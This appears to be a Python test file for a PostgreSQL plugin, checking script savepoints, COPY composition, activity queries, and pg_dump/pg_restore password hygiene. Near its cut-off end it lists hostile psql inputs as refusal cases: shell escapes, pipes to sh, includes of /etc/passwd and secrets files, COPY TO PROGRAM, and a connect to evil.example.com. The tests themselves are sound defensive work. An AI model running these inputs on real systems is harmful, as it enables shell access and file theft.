#!/usr/bin/env python3
"""Hermetic tests for the build-1 families of external_postgres_plugin.

No database and no client program runs: psycopg cursors are fakes that replay
real-shaped server transcripts (command tags, SQLSTATEs, pg_stat_activity
rows), and ``subprocess.run`` is replaced by a recorder that replays real
pg_dump / pg_restore / psql stderr. The live proof of the same families is
smoke_multistatement.py (run_script) and smoke_write.py (the acceptance walk).

Covers run_script (savepoints, rollback / continue / dry run, the typed
failing-statement error, transaction-control refusal), copy (COPY statement
composition for every option, streaming, path gate), activity and statistics
(bound parameters, pagination with next_offset, signals, resets), dump and
restore (vendor option rendering, format detection, argv/env/passfile hygiene,
stderr classification, plain-SQL restore refusal), the plugin's config
fail-louds, and the three artifacts per process.

Run:
    SOLET_NAME=<name> .venv/bin/python3 \
        plugins/external_postgres_plugin/tests/smoke_build1_families.py
"""

from __future__ import annotations

import sys
from pathlib import Path
from unittest.mock import NonCallableMagicMock

sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "ananta/src"))
import json  # noqa: E402
import os  # noqa: E402
import stat  # noqa: E402
import subprocess  # noqa: E402
import tempfile  # noqa: E402
import unittest  # noqa: E402
from datetime import UTC, datetime  # noqa: E402
from pathlib import Path  # noqa: E402
from types import SimpleNamespace  # noqa: E402
from typing import Any  # noqa: E402
from unittest.mock import MagicMock, patch  # noqa: E402

from ananta.file_locations.containment import PathRefusedError, assert_path_allowed, derive_allowed_roots  # noqa: E402
from ananta.file_locations.resolution import PathAddress, SoletTree  # noqa: E402

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "plugins" / "external_postgres_plugin" / "src"))

from external_postgres_plugin import (  # noqa: E402
    admin_actions,
    async_jobs,
    client_tools,
    copy_actions,
    script_actions,
)  # noqa: E402
from external_postgres_plugin.app_config import ExternalDsn, ExternalPgConfigError  # noqa: E402
from external_postgres_plugin.connection import ExternalPgGuardError  # noqa: E402
from external_postgres_plugin.plugin import ExternalPostgresPlugin  # noqa: E402

PASSWORD = 'p:a"s\\s/w+rd é'
HOST = "db-prod-7.internal.example.com"
DSN = ExternalDsn(
    name="warehouse",
    host=HOST,
    port=5433,
    dbname="sales",
    user="app_owner",
    password=PASSWORD,
    sslmode="require",
)
SETTINGS = client_tools.ToolSettings(bin_dir="", timeout_seconds=60, platform_pg_port=5432)
NEW_PROCESSES = (
    "run_script",
    "copy",
    "dump_database",
    "restore_database",
    "activity",
    "statistics",
)


_LOCATION_ROOT = Path(__file__).resolve().parents[3]
_LOCATION_TREE = SoletTree(_LOCATION_ROOT, _LOCATION_ROOT / "profile")


def _checked_path(path: str, directories: list[str], *, suffix: str | None = ".tsv", param_name: str = "output_tsv_path", reading: bool = False) -> str:
    """Exercise real address-derived containment, never a mocked boundary."""
    addresses = [PathAddress(f"project-{index}", Path(directory), frozenset(), frozenset(), datetime.now(UTC)) for index, directory in enumerate(directories)]
    roots = derive_allowed_roots(addresses, None, _LOCATION_TREE, _LOCATION_ROOT.parent / "test-solet-files")
    result = assert_path_allowed(path, roots, _LOCATION_TREE, suffix=suffix, param_name=param_name, plugin_name="test")
    if reading and not Path(result.value).is_file():
        raise PathRefusedError(f"{param_name} must name an existing regular file")
    return result.value


def _bind_locations(plugin: Any, directories: list[str]) -> NonCallableMagicMock:
    """Supply a live address-book service through the production binding."""
    orchestrator = NonCallableMagicMock()
    orchestrator.APP_HOME = str(_LOCATION_TREE.app_home)
    orchestrator.plugin_manager.get_plugin.return_value = None
    orchestrator.get_service.return_value.list_path_addresses.return_value = {
        "action_status": "completed",
        "data": {"addresses": [{"name": f"project-{index}", "tags": [], "updated_at": datetime.now(UTC).isoformat(), "entries": [{"field_type": "path", "value": directory}]} for index, directory in enumerate(directories)]},
    }
    plugin.orchestrator_ref = orchestrator
    return orchestrator


class PgError(Exception):
    """A psycopg-shaped server error: SQLSTATE plus diag.message_primary."""

    def __init__(self, sqlstate: str, primary: str) -> None:
        super().__init__(primary)
        self.sqlstate = sqlstate
        self.diag = SimpleNamespace(message_primary=primary)


class ScriptCursor:
    """Replays a server transcript: per statement text, a command tag or an error."""

    def __init__(self, transcript: dict[str, Any]) -> None:
        self.transcript = transcript
        self.executed: list[str] = []
        self.statusmessage: str | None = None
        self.rowcount = -1
        self.description: list[Any] | None = None

    def __enter__(self) -> ScriptCursor:
        return self

    def __exit__(self, *_exc: object) -> bool:
        return False

    def execute(self, sql: str, params: Any = None) -> None:
        self.executed.append(sql)
        outcome = self.transcript.get(sql)
        if isinstance(outcome, Exception):
            raise outcome
        tag, rowcount, has_rows = outcome if outcome else (sql.split()[0].upper(), -1, False)
        self.statusmessage, self.rowcount = tag, rowcount
        self.description = [SimpleNamespace(name="x")] if has_rows else None


def script_conn(transcript: dict[str, Any]) -> tuple[MagicMock, ScriptCursor]:
    cursor = ScriptCursor(transcript)
    conn = MagicMock()
    conn.cursor.return_value = cursor
    return conn, cursor


def rows_conn(columns: list[str], rows: list[tuple[Any, ...]]) -> tuple[MagicMock, MagicMock]:
    cur = MagicMock()
    cur.description = [SimpleNamespace(name=c) for c in columns]
    cur.fetchall.return_value = rows
    cur.fetchone.return_value = rows[0] if rows else None
    ctx = MagicMock()
    ctx.__enter__.return_value = cur
    conn = MagicMock()
    conn.cursor.return_value = ctx
    return conn, cur


def passthrough(path: str, _param: str) -> str:
    return path


class RunScript(unittest.TestCase):
    MIGRATION = "CREATE SCHEMA app;\nCREATE SEQUENCE app.customer_seq;\nINSERT INTO app.customer VALUES (1, 'a'), (2, 'b');\n"

    def test_success_runs_each_statement_in_a_savepoint_and_commits(self) -> None:
        conn, cur = script_conn(
            {
                "INSERT INTO app.customer VALUES (1, 'a'), (2, 'b')": ("INSERT 0 2", 2, False),
            }
        )
        result = script_actions.run_script(conn, {"sql": self.MIGRATION})
        self.assertEqual(result["statement_count"], 3)
        self.assertEqual(result["failed_count"], 0)
        self.assertTrue(result["committed"])
        self.assertEqual(result["statements"][2]["command_tag"], "INSERT 0 2")
        self.assertEqual(result["statements"][2]["rowcount"], 2)
        self.assertEqual(cur.executed[0], "SAVEPOINT epg_script_statement")
        self.assertEqual(cur.executed[1], "CREATE SCHEMA app")
        self.assertEqual(cur.executed[2], "RELEASE SAVEPOINT epg_script_statement")
        conn.commit.assert_called_once()
        conn.rollback.assert_not_called()

    def test_rollback_mode_names_the_failing_statement_and_rolls_back(self) -> None:
        failing = "CREATE SEQUENCE app.customer_seq"
        conn, cur = script_conn({failing: PgError("42P07", 'relation "customer" already exists')})
        with self.assertRaises(script_actions.ScriptStatementError) as caught:
            script_actions.run_script(conn, {"sql": self.MIGRATION})
        message = str(caught.exception)
        self.assertEqual(caught.exception.code, "external_pg.script_statement_failed")
        self.assertIn("statement 2 of 3", message)
        self.assertIn("CREATE SEQUENCE app.customer_seq", message)
        self.assertIn("SQLSTATE 42P07", message)
        self.assertIn('relation "customer" already exists', message)
        self.assertIn("rolled back", message)
        self.assertIn("ROLLBACK TO SAVEPOINT epg_script_statement", cur.executed)
        self.assertNotIn("INSERT INTO app.customer VALUES (1, 'a'), (2, 'b')", cur.executed)
        conn.rollback.assert_called_once()
        conn.commit.assert_not_called()

    def test_permission_failure_keeps_the_fixed_topology_safe_message(self) -> None:
        conn, _ = script_conn({"CREATE SCHEMA app": PgError("42501", "permission denied for database sales")})
        with self.assertRaises(script_actions.ScriptStatementError) as caught:
            script_actions.run_script(conn, {"sql": self.MIGRATION})
        self.assertIn("external_pg.permission_denied", str(caught.exception))
        self.assertNotIn("sales", str(caught.exception))

    def test_continue_mode_skips_only_the_failing_statement(self) -> None:
        failing = "CREATE SEQUENCE app.customer_seq"
        conn, _ = script_conn({failing: PgError("42P07", "relation exists")})
        result = script_actions.run_script(conn, {"sql": self.MIGRATION, "on_error": "continue"})
        self.assertEqual((result["succeeded_count"], result["failed_count"]), (2, 1))
        self.assertEqual(result["statements"][1]["status"], "failed")
        self.assertEqual(result["statements"][1]["sqlstate"], "42P07")
        conn.commit.assert_called_once()

    def test_commit_false_is_a_dry_run(self) -> None:
        conn, _ = script_conn({})
        result = script_actions.run_script(conn, {"sql": self.MIGRATION, "commit": False})
        self.assertFalse(result["committed"])
        conn.rollback.assert_called_once()
        conn.commit.assert_not_called()

    def test_transaction_control_is_refused_before_anything_runs(self) -> None:
        for statement in ("BEGIN", "COMMIT", "ROLLBACK", "SAVEPOINT s", "PREPARE TRANSACTION 'x'"):
            conn, cur = script_conn({})
            with self.assertRaises(ValueError):
                script_actions.run_script(conn, {"sql": f"SELECT 1; {statement};"})
            self.assertEqual(cur.executed, [])

    def test_a_prepared_statement_is_not_transaction_control(self) -> None:
        conn, _ = script_conn({})
        result = script_actions.run_script(conn, {"sql": "PREPARE q AS SELECT 1; EXECUTE q;"})
        self.assertEqual(result["statement_count"], 2)

    def test_a_dead_connection_propagates(self) -> None:
        conn, _ = script_conn({"CREATE SCHEMA app": OSError("server closed the connection")})
        with self.assertRaises(OSError):
            script_actions.run_script(conn, {"sql": self.MIGRATION})

    def test_invalid_parameters(self) -> None:
        conn, _ = script_conn({})
        for params in ({"sql": " -- nothing "}, {"sql": "SELECT 1", "on_error": "ignore"}, {"sql": "SELECT 1", "commit": "yes"}):
            with self.assertRaises(ValueError):
                script_actions.run_script(conn, params)


class Copy(unittest.TestCase):
    def render(self, params: dict[str, Any], direction: str) -> str:
        return str(copy_actions.build_copy_statement(params, direction).as_string(None))

    def test_from_file_renders_every_option_as_the_vendor_shape(self) -> None:
        params = {
            "schema": "app",
            "table": "customer",
            "columns": ["id", "name"],
            "format": "csv",
            "freeze": False,
            "delimiter": ";",
            "null": "\\N",
            "default": "@d",
            "header": "match",
            "quote": "'",
            "escape": "\\",
            "force_not_null": ["name"],
            "force_null": ["*"],
            "on_error": "ignore",
            "encoding": "UTF8",
            "log_verbosity": "verbose",
            "where": "id > 0",
        }
        self.assertEqual(
            self.render(params, "FROM STDIN"),
            "COPY \"app\".\"customer\" (\"id\", \"name\") FROM STDIN WITH (FORMAT CSV, FREEZE FALSE, DELIMITER ';', NULL  E'\\\\N', DEFAULT '@d', HEADER MATCH, QUOTE '''', ESCAPE  E'\\\\', FORCE_NOT_NULL (\"name\"), FORCE_NULL *, ON_ERROR IGNORE, ENCODING 'UTF8', LOG_VERBOSITY VERBOSE) WHERE id > 0",
        )

    def test_to_file_from_a_query(self) -> None:
        rendered = self.render(
            {"query": "SELECT id FROM app.customer;", "format": "csv", "header": True, "force_quote": ["*"]},
            "TO STDOUT",
        )
        self.assertEqual(
            rendered,
            "COPY (SELECT id FROM app.customer) TO STDOUT WITH (FORMAT CSV, HEADER TRUE, FORCE_QUOTE *)",
        )

    def test_identifiers_are_quoted_never_interpolated(self) -> None:
        rendered = self.render({"schema": 'a"b', "table": "t; DROP TABLE x"}, "TO STDOUT")
        self.assertEqual(rendered, 'COPY "a""b"."t; DROP TABLE x" TO STDOUT')

    def test_invalid_options_are_refused(self) -> None:
        for params, direction in (
            ({"schema": "a", "table": "t", "format": "xml"}, "TO STDOUT"),
            ({"schema": "a", "table": "t", "header": "yes"}, "TO STDOUT"),
            ({"schema": "a", "table": "t", "force_quote": "id"}, "TO STDOUT"),
            ({"schema": "a", "table": "t", "where": "id > 0"}, "TO STDOUT"),
            ({"query": "SELECT 1", "table": "t"}, "TO STDOUT"),
            ({"schema": "a"}, "FROM STDIN"),
        ):
            with self.assertRaises(ValueError):
                copy_actions.build_copy_statement(params, direction)

    def test_from_file_streams_the_file_and_commits(self) -> None:
        with tempfile.TemporaryDirectory() as workspace:
            source = Path(workspace) / "customers.csv"
            source.write_bytes(b"id,name\n1,a\n2,b\n")
            copy_obj = MagicMock()
            cur = MagicMock()
            cur.rowcount = 2
            cur.copy.return_value.__enter__.return_value = copy_obj
            conn = MagicMock()
            conn.cursor.return_value.__enter__.return_value = cur
            gated: list[tuple[str, str]] = []

            def gate(path: str, param: str) -> str:
                gated.append((path, param))
                return path

            result = copy_actions.run_copy(
                conn,
                {
                    "operation": "from_file",
                    "path": str(source),
                    "schema": "app",
                    "table": "customer",
                    "format": "csv",
                    "header": True,
                },
                gate,
            )
        self.assertEqual(gated, [(str(source), "path")])
        copy_obj.write.assert_called_once_with(b"id,name\n1,a\n2,b\n")
        self.assertEqual((result["rowcount"], result["bytes"]), (2, 16))
        conn.commit.assert_called_once()

    def test_to_file_writes_every_chunk(self) -> None:
        with tempfile.TemporaryDirectory() as workspace:
            target = Path(workspace) / "out.csv"
            cur = MagicMock()
            cur.rowcount = 2
            cur.copy.return_value.__enter__.return_value = iter([b"1,a\n", memoryview(b"2,b\n")])
            conn = MagicMock()
            conn.cursor.return_value.__enter__.return_value = cur
            result = copy_actions.run_copy(
                conn,
                {
                    "operation": "to_file",
                    "path": str(target),
                    "schema": "app",
                    "table": "customer",
                },
                passthrough,
            )
            self.assertEqual(target.read_bytes(), b"1,a\n2,b\n")
        self.assertEqual((result["rowcount"], result["bytes"]), (2, 8))

    def test_unknown_operation_and_missing_input(self) -> None:
        conn = MagicMock()
        with self.assertRaises(ValueError):
            copy_actions.run_copy(conn, {"operation": "sync"}, passthrough)
        with self.assertRaises(ValueError):
            copy_actions.run_copy(
                conn,
                {
                    "operation": "from_file",
                    "path": "/nonexistent/x.csv",
                    "schema": "a",
                    "table": "t",
                },
                passthrough,
            )


class Admin(unittest.TestCase):
    ACTIVITY_COLUMNS = [
        "pid",
        "datname",
        "usename",
        "application_name",
        "client_addr",
        "backend_type",
        "state",
        "wait_event_type",
        "wait_event",
        "backend_start",
        "xact_start",
        "query_start",
        "state_change",
        "backend_xid",
        "backend_xmin",
        "query",
    ]

    def activity_row(self, pid: int) -> tuple[Any, ...]:
        return (
            pid,
            "sales",
            "app_owner",
            "psql",
            "10.0.4.17",
            "client backend",
            "active",
            "Lock",
            "relation",
            "2026-11-07 16:40:01.5+00",
            "2026-11-07 16:41:00+00",
            "2026-11-07 16:41:00+00",
            "2026-11-07 16:41:00+00",
            "7811",
            "7809",
            "UPDATE app.customer SET name = $1 WHERE id = $2",
        )

    def test_activity_list_pages_with_next_offset_and_bound_filters(self) -> None:
        rows = [self.activity_row(pid) for pid in (101, 102, 103)]
        conn, cur = rows_conn(self.ACTIVITY_COLUMNS, rows)
        result = admin_actions.run_activity(conn, {"operation": "list", "limit": 2, "offset": 4, "state": "active"})
        self.assertEqual(result["returned"], 2)
        self.assertEqual(result["next_offset"], 6)
        self.assertEqual(result["rows"][0]["pid"], 101)
        self.assertEqual(result["rows"][0]["wait_event"], "relation")
        self.assertEqual(cur.execute.call_args.args[1], ("active", "active", None, None, 3, 4))

    def test_last_page_has_no_next_offset(self) -> None:
        conn, _ = rows_conn(self.ACTIVITY_COLUMNS, [self.activity_row(101)])
        result = admin_actions.run_activity(conn, {"operation": "list"})
        self.assertIsNone(result["next_offset"])
        self.assertEqual(result["limit"], 100)

    def test_locks_show_blocking_pids(self) -> None:
        columns = ["pid", "locktype", "database", "relation", "page", "tuple", "virtualxid", "transactionid", "mode", "granted", "fastpath", "waitstart", "blocked_by"]
        conn, cur = rows_conn(columns, [(202, "relation", 16384, "app.customer", None, None, None, None, "RowExclusiveLock", False, False, "2026-11-07 16:41:02+00", [101])])
        result = admin_actions.run_activity(conn, {"operation": "locks", "granted": False})
        self.assertEqual(result["rows"][0]["blocked_by"], [101])
        self.assertEqual(cur.execute.call_args.args[1], (False, False, 101, 0))

    def test_cancel_and_terminate_signal_by_pid(self) -> None:
        conn, cur = rows_conn(["signalled"], [(True,)])
        self.assertEqual(admin_actions.run_activity(conn, {"operation": "cancel", "pid": 101}), {"operation": "cancel", "pid": 101, "signalled": True})
        result = admin_actions.run_activity(conn, {"operation": "terminate", "pid": 101, "timeout_ms": 5000})
        self.assertTrue(result["signalled"])
        self.assertEqual(cur.execute.call_args.args[1], (101, 5000))

    def test_statistics_relation_sizes_and_reset_table(self) -> None:
        columns = ["schema", "relation", "kind", "total_bytes", "table_bytes", "index_bytes", "estimated_rows"]
        conn, cur = rows_conn(columns, [("app", "customer", "r", 81920, 49152, 32768, 2)])
        result = admin_actions.run_statistics(conn, {"operation": "relation_sizes", "schema": "app"})
        self.assertEqual(result["rows"][0]["total_bytes"], 81920)
        self.assertEqual(cur.execute.call_args.args[1], ("app", "app", 101, 0))
        missing, _ = rows_conn(["r"], [])
        with self.assertRaises(ValueError):
            admin_actions.run_statistics(missing, {"operation": "reset_table", "schema": "app", "table": "gone"})
        found, _ = rows_conn(["r"], [("",)])
        self.assertTrue(admin_actions.run_statistics(found, {"operation": "reset_table", "schema": "app", "table": "customer"})["reset"])
        found.commit.assert_called_once()

    def test_invalid_operation_and_paging(self) -> None:
        conn, _ = rows_conn(["x"], [])
        for params in ({"operation": "vacuum"}, {"operation": "list", "limit": 0}, {"operation": "list", "limit": 1001}, {"operation": "list", "offset": -1}, {"operation": "cancel"}, {"operation": "terminate", "pid": 5, "timeout_ms": -1}):
            with self.assertRaises(ValueError):
                admin_actions.run_activity(conn, params)


class ClientTools(unittest.TestCase):
    def test_every_vendor_option_kind_renders_as_its_long_flag(self) -> None:
        gated: list[str] = []

        def gate(path: str, param: str) -> str:
            gated.append(param)
            return "/w/" + os.path.basename(path)

        args = client_tools.option_args(
            {
                "schema_only": True,
                "no_owner": False,
                "jobs": 4,
                "exclude_table_data": ["audit.*", "logs"],
                "compress": "zstd:3",
                "filter": "/w/filter.txt",
                "role": "dumper",
            },
            client_tools.PG_DUMP_OPTIONS,
            gate,
        )
        self.assertEqual(
            args,
            [
                "--jobs=4",
                "--compress=zstd:3",
                "--schema-only",
                "--exclude-table-data=audit.*",
                "--exclude-table-data=logs",
                "--filter=/w/filter.txt",
                "--role=dumper",
            ],
        )
        self.assertEqual(gated, ["filter"])
        for bad in ({"jobs": "4"}, {"schema": "public"}, {"clean": "yes"}, {"role": ""}):
            with self.assertRaises(ValueError):
                client_tools.option_args(bad, client_tools.PG_DUMP_OPTIONS, gate)

    def test_declared_options_match_the_vendor_help(self) -> None:
        dump_help = {"no_toast_compression", "exclude_table_and_children", "restrict_key", "sync_method", "large_objects"}
        restore_help = {"transaction_size", "no_data_for_failed_tables", "use_list", "exit_on_error"}
        self.assertTrue(dump_help <= set(client_tools.PG_DUMP_OPTIONS))
        self.assertTrue(restore_help <= set(client_tools.PG_RESTORE_OPTIONS))
        for excluded in ("file", "format", "host", "port", "username", "password", "dbname"):
            self.assertNotIn(excluded, client_tools.PG_DUMP_OPTIONS)
            self.assertNotIn(excluded, client_tools.PG_RESTORE_OPTIONS)

    def test_dump_format_detection(self) -> None:
        with tempfile.TemporaryDirectory() as workspace:
            custom = Path(workspace) / "c.dump"
            custom.write_bytes(b"PGDMP\x01\x10\x00" + b"\x00" * 600)
            tar = Path(workspace) / "t.tar"
            tar.write_bytes(b"toc.dat".ljust(257, b"\x00") + b"ustar\x0000" + b"\x00" * 300)
            plain = Path(workspace) / "p.sql"
            plain.write_text("--\n-- PostgreSQL database dump\n--\n")
            self.assertEqual(client_tools.detect_dump_format(str(custom)), "custom")
            self.assertEqual(client_tools.detect_dump_format(str(tar)), "tar")
            self.assertEqual(client_tools.detect_dump_format(str(plain)), "plain")
            self.assertEqual(client_tools.detect_dump_format(workspace), "directory")

    def test_failure_transcripts_classify_topology_safe(self) -> None:
        auth = f'pg_dump: error: connection to server at "{HOST}" (10.0.0.5), port 5433 failed: FATAL:  password authentication failed for user "app_owner"'
        error = client_tools.classify_tool_failure("pg_dump", 1, auth)
        self.assertEqual(error.code, "external_pg.auth_failed")
        self.assertNotIn("app_owner", str(error))
        refused = f'pg_dump: error: connection to server at "{HOST}" (10.0.0.5), port 5433 failed: Connection refused'
        self.assertEqual(client_tools.classify_tool_failure("pg_dump", 1, refused).code, "external_pg.api_error")
        denied = "pg_dump: error: query failed: ERROR:  permission denied for table customer"
        self.assertEqual(client_tools.classify_tool_failure("pg_dump", 1, denied).code, "external_pg.permission_denied")
        mismatch = "pg_dump: error: aborting because of server version mismatch\npg_dump: detail: server version: 18.1; pg_dump version: 17.10 (Homebrew)"
        failed = client_tools.classify_tool_failure("pg_dump", 1, mismatch)
        self.assertEqual(failed.code, "external_pg.client_tool_failed")
        self.assertIn("server version mismatch", str(failed))

    def test_missing_program_names_the_config_key(self) -> None:
        with tempfile.TemporaryDirectory() as empty:
            with self.assertRaises(client_tools.ClientToolError) as caught:
                client_tools.resolve_tool("pg_dump", empty)
        self.assertEqual(caught.exception.code, "external_pg.client_tool_missing")
        self.assertIn("client_bin_dir", str(caught.exception))

    def run_dump(self, stderr: bytes, returncode: int) -> tuple[dict[str, Any], list[dict[str, Any]]]:
        seen: list[dict[str, Any]] = []

        def fake_run(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess[bytes]:
            passfile = kwargs["env"]["PGPASSFILE"]
            seen.append(
                {
                    "argv": argv,
                    "env": dict(kwargs["env"]),
                    "passfile": passfile,
                    "mode": stat.S_IMODE(os.stat(passfile).st_mode),
                    "content": Path(passfile).read_text(encoding="utf-8"),
                }
            )
            Path(argv[3].removeprefix("--file=")).write_bytes(b"PGDMP" + b"\x00" * 40)
            return subprocess.CompletedProcess(argv, returncode, b"", stderr)

        with tempfile.TemporaryDirectory() as workspace, patch.object(client_tools.subprocess, "run", fake_run), patch.object(client_tools, "resolve_tool", lambda name, _bin: f"/opt/pg/bin/{name}"), patch.dict(os.environ, {"PGPASSWORD": "leak", "PGHOST": "elsewhere"}):
            result = client_tools.dump_database(
                DSN,
                {"output_path": f"{workspace}/sales.dump", "format": "custom", "schema": ["app"]},
                passthrough,
                SETTINGS,
            )
        return result, seen

    def test_dump_keeps_the_password_out_of_argv_and_env_and_removes_the_passfile(self) -> None:
        result, seen = self.run_dump(b"", 0)
        call = seen[0]
        self.assertEqual(call["argv"][0], "/opt/pg/bin/pg_dump")
        self.assertIn("--no-password", call["argv"])
        self.assertIn("--format=custom", call["argv"])
        self.assertIn("--schema=app", call["argv"])
        self.assertEqual(call["argv"][-1], "--dbname=dbname='sales'")
        self.assertFalse(any(PASSWORD in arg for arg in call["argv"]))
        self.assertNotIn("PGPASSWORD", call["env"])
        self.assertEqual((call["env"]["PGHOST"], call["env"]["PGPORT"], call["env"]["PGUSER"]), (HOST, "5433", "app_owner"))
        self.assertEqual(call["mode"], 0o600)
        self.assertEqual(call["content"], '*:*:*:*:p\\:a"s\\\\s/w+rd é\n')
        self.assertFalse(os.path.exists(call["passfile"]))
        self.assertEqual((result["format"], result["bytes"]), ("custom", 45))

    def test_dump_failure_keeps_stderr_without_the_host(self) -> None:
        stderr = (f'pg_dump: error: query failed: ERROR:  syntax error near "token" on "{HOST}"').encode()
        with self.assertRaises(client_tools.ClientToolError) as caught:
            self.run_dump(stderr, 1)
        message = str(caught.exception)
        self.assertEqual(caught.exception.code, "external_pg.client_tool_failed")
        self.assertIn('syntax error near "token"', message)
        self.assertNotIn(HOST, message)

    def test_restore_refuses_a_format_that_differs_from_the_file(self) -> None:
        with tempfile.TemporaryDirectory() as workspace:
            dump = Path(workspace) / "sales.sql"
            dump.write_text("CREATE SCHEMA app;\n")
            with self.assertRaises(ValueError):
                client_tools.restore_database(DSN, {"input_path": str(dump), "format": "custom"}, passthrough, SETTINGS)


class RunStatementAutocommit(unittest.TestCase):
    def test_autocommit_is_set_before_the_statement_runs(self) -> None:
        from external_postgres_plugin import query_actions

        conn, cur = rows_conn([], [])
        cur.description = None
        cur.rowcount = -1
        result = query_actions.run_statement(conn, {"sql": "VACUUM app.customer", "autocommit": True}, lambda p: p)
        self.assertTrue(conn.autocommit)
        self.assertEqual(result, {"rowcount": -1, "has_result_set": False, "autocommit": True})
        with self.assertRaises(ValueError):
            query_actions.run_statement(conn, {"sql": "VACUUM", "autocommit": "yes"}, lambda p: p)

    def test_autocommit_result_set_without_path_says_it_already_committed(self) -> None:
        from external_postgres_plugin import query_actions

        conn, _ = rows_conn(["id"], [(1,)])
        with self.assertRaises(ValueError) as caught:
            query_actions.run_statement(conn, {"sql": "DELETE FROM t RETURNING id", "autocommit": True}, lambda p: p)
        self.assertIn("already ran in autocommit mode", str(caught.exception))


class PluginWiring(unittest.TestCase):
    def plugin(self, config: dict[str, object]) -> ExternalPostgresPlugin:
        plugin = ExternalPostgresPlugin()
        plugin.initialize(config)
        _bind_locations(plugin, [str(root) for root in roots] if isinstance(roots := config.get("export_allowed_roots"), list) else [])
        return plugin

    def test_tool_settings_fail_loud(self) -> None:
        settings = self.plugin({})._tool_settings()
        self.assertEqual((settings.bin_dir, settings.timeout_seconds), ("", 3600))
        bad_configs: tuple[dict[str, object], ...] = (
            {"client_tool_timeout_seconds": 0},
            {"client_tool_timeout_seconds": "x"},
            {"client_bin_dir": 5},
        )
        for bad in bad_configs:
            with self.assertRaises(ExternalPgConfigError):
                self.plugin(bad)._tool_settings()

    def test_file_gate_uses_export_allowed_roots_for_any_suffix(self) -> None:
        with tempfile.TemporaryDirectory() as workspace:
            plugin = self.plugin({"export_allowed_roots": [workspace]})
            inside = os.path.join(workspace, "sales.dump")
            self.assertEqual(plugin._file_path_gate(inside, "output_path"), os.path.realpath(inside))
            with self.assertRaises(PathRefusedError) as caught:
                plugin._file_path_gate("/etc/passwd", "input_path")
            self.assertIn("input_path", str(caught.exception))
        with self.assertRaises(PathRefusedError):
            self.plugin({})._file_path_gate("/tmp/x.csv", "path")

    def test_dump_and_restore_are_guarded_against_the_platform_database(self) -> None:
        plugin = self.plugin({})
        plugin._app_config_loader = MagicMock()  # type: ignore[assignment]
        platform = ExternalDsn(name="self", host="localhost", port=5432, dbname=os.environ["SOLET_NAME"], user="u", password="", sslmode="disable")
        plugin._app_config_loader.resolve.return_value = platform  # type: ignore[union-attr]
        ran: list[str] = []
        outcome = plugin._run_with_dsn({"connection_name": "self"}, lambda dsn: {"ran": ran.append(dsn.name)}, "dump_database")
        self.assertEqual(outcome["error"]["code"], "external_pg.platform_db_refused")
        self.assertEqual(ran, [])

    def test_worker_routes_each_family(self) -> None:
        handlers = async_jobs.ACTION_HANDLERS
        self.assertEqual({type(handler) for handler in handlers.values()}, {async_jobs.ActionHandler})
        self.assertEqual(handlers["copy"].gate, "file")
        self.assertEqual((handlers["dump_database"].target, handlers["restore_database"].target), ("dsn", "dsn"))
        self.assertEqual(handlers["run_script"].gate, "none")
        self.assertEqual(handlers["run_query"].gate, "tsv")

    def test_run_action_passes_the_file_gate_and_tool_settings(self) -> None:
        plugin = MagicMock()
        plugin._run_with_dsn.side_effect = lambda params, action, verb: action(DSN)
        plugin._run_on_connection.side_effect = lambda params, action, verb: action("conn")
        seen: list[tuple[Any, ...]] = []
        dump = async_jobs.ActionHandler(lambda *args: {"args": seen.append(args)}, gate="file", target="dsn")
        async_jobs.run_action(plugin, dump, "dump_database", {"connection_name": "w"})
        self.assertEqual(seen[-1], (DSN, {"connection_name": "w"}, plugin._file_path_gate, plugin._tool_settings()))
        script = async_jobs.ActionHandler(lambda *args: {"args": seen.append(args)})
        async_jobs.run_action(plugin, script, "run_script", {"sql": "SELECT 1"})
        self.assertEqual(seen[-1], ("conn", {"sql": "SELECT 1"}))
        export = async_jobs.ActionHandler(lambda *args: {"args": seen.append(args)}, gate="tsv")
        async_jobs.run_action(plugin, export, "run_query", {})
        self.assertEqual(seen[-1], ("conn", {}, plugin._export_path_gate))

    def test_assert_path_allowed_any_suffix_and_required_suffix(self) -> None:
        with tempfile.TemporaryDirectory() as workspace:
            dump = os.path.join(workspace, "walk.dump")
            admitted = _checked_path(dump, [workspace], suffix=None, param_name="output_path", reading=False)
            self.assertEqual(admitted, os.path.realpath(dump))
            with self.assertRaises(PathRefusedError) as caught:
                _checked_path(dump, [workspace], suffix=".tsv", param_name="output_tsv_path", reading=False)
            self.assertIn("output_tsv_path", str(caught.exception))
            with self.assertRaises(PathRefusedError):
                _checked_path("relative/walk.dump", [workspace], suffix=None, param_name="output_path", reading=False)


PG_DUMP_PLAIN = (
    "--\n-- PostgreSQL database dump\n--\n\n"
    "\\restrict 8yQ2pXc0aZt9LmVb\n\n"
    "SET statement_timeout = 0;\nSET standard_conforming_strings = on;\n"
    "SELECT pg_catalog.set_config('search_path', '', false);\n"
    "CREATE SCHEMA epg_walk;\n"
    "CREATE FUNCTION epg_walk.digits(t text) RETURNS text\n    LANGUAGE sql\n"
    "    AS $_$ SELECT regexp_replace(t, '\\D', '', 'g'); $_$;\n"
    "COMMENT ON SCHEMA epg_walk IS E'line\\nbreak \\\\ and a quote \\'';\n"
    "COPY epg_walk.customer (id, name, email) FROM stdin;\n"
    "1\tAlice\talice@example.com\n2\tEd\\\\sger\t\\N\n3\tback\\tslash \\! not a command\t\\N\n\\.\n\n"
    "/* a /* nested */ comment with \\! inside */\n"
    "-- \\! in a line comment\n"
    "\\unrestrict 8yQ2pXc0aZt9LmVb\n"
)
DANGEROUS_SCRIPTS = {
    "shell": "\\! touch /tmp/epg_pwned\n",
    "output pipe": "\\o |sh\nSELECT 1;\n",
    "query pipe": "SELECT 'id' \\g |sh\n",
    "include": "\\i /etc/passwd\n",
    "relative include": "\\ir ../../secrets.sql\n",
    "frontend copy program": "\\copy (SELECT 1) TO PROGRAM 'sh -c id'\n",
    "gexec": "SELECT '\\! id' \\gexec\n",
    "setenv": "\\setenv PGHOST elsewhere\n",
    "cd": "\\cd /\n",
    "set variable": "\\set ON_ERROR_STOP 0\n",
    "write buffer": "SELECT 1\n\\w /tmp/out\n",
    "e-string escape then shell": "SELECT E'a\\\\'; \\! id\n",
    "plain string ends at backslash": "SELECT 'a\\'; \\! id\n",
    "scs off": "SET standard_conforming_strings = off;\nSELECT 'a\\'; \\! id';\n",
    "scs via set_config": "SELECT set_config('standard_conforming_strings', 'off', false);\n",
    "connect with host": "\\connect sales app_owner evil.example.com 5432\n",
